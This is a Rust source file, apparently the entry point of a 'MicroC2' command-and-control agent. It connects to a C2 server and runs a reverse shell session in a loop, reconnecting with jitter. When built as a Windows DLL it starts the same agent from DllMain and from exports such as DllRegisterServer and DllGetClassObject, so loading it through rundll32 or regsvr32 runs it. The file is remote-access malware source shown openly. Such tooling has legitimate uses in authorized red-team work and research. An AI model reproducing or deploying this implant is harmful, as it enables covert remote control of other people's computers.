extern crate tokio;
extern crate hyper;
extern crate chrono;
extern crate uuid;

mod file_handling;
mod commands;
mod config;

use commands::command_shell::run_shell;
use config::AgentConfig;
use std::env;
use uuid::Uuid;

#[cfg(feature = "dll")]
use std::os::raw::c_int;

// Main entry point for standalone executable
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Call the shared agent code
    run_agent().await
}

// Shared agent code used by both executable and DLL
async fn run_agent() -> Result<(), Box<dyn std::error::Error>> {
    let agent_id = Uuid::new_v4().to_string();
    println!("[STARTUP] MicroC2 Agent starting...");
    println!("[INFO] Agent ID: {}", agent_id);
    
    // Load configuration or use command line args
    let config = AgentConfig::load()?;
    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    println!("[NETWORK] Attempting connection to C2: {}", server_addr);
    
    loop {
        match run_shell(&server_addr).await {
            Ok(_) => println!("[INFO] Shell session ended"),
            Err(e) => println!("[ERROR] Shell error: {}. Retrying...", e),
        }
        
        // Add jitter to reconnection attempts
        let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
        println!("[RETRY] Attempting to reconnect...");
    }
}

// === DLL Exports ===
// Only compile these when the "dll" feature is enabled

#[cfg(feature = "dll")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "C" fn DllMain(_hinst: usize, reason: u32, _reserved: usize) -> c_int {
    // DLL_PROCESS_ATTACH = 1
    if reason == 1 {
        // Start a background thread to run the agent
        std::thread::spawn(|| {
            // Create a tokio runtime
            let rt = tokio::runtime::Runtime::new().unwrap();
            // Run the agent in the runtime
            rt.block_on(async {
                let _ = run_agent().await;
            });
        });
    }
    1 // Return true
}

#[cfg(feature = "dll")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "C" fn RunAgent() -> c_int {
    // Create a tokio runtime
    match tokio::runtime::Runtime::new() {
        Ok(rt) => {
            // Run the agent in the runtime
            rt.block_on(async {
                let _ = run_agent().await;
            });
            1 // Success
        },
        Err(_) => 0 // Failure
    }
}

// Additional DLL exports that Windows might expect
#[cfg(feature = "dll")]
#[no_mangle]
pub extern "C" fn DllRegisterServer() -> c_int {
    RunAgent()
}

#[cfg(feature = "dll")]
#[no_mangle]
pub extern "C" fn DllUnregisterServer() -> c_int {
    1 // Success
}

// This allows rundll32.exe to call this export directly
#[cfg(feature = "dll")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "C" fn DllGetClassObject() -> c_int {
    RunAgent()
}
